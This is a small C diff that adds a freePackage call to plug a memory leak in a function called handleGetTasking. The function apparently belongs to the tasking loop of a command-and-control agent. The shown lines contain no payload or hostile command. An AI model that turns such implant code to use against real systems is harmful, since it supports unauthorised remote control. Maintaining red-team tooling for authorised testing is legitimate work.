@@ -37,6 +37,7 @@ BOOL handleGetTasking(PParser getTasking)
 			// Create output package
 			PPackage output = newPackage(0, FALSE);
 			addBytes(response, (PBYTE)output->buffer, output->length, TRUE);
+			freePackage(output);
 
 			// Send response before exiting
 			PParser responseParser = sendPackage(response);
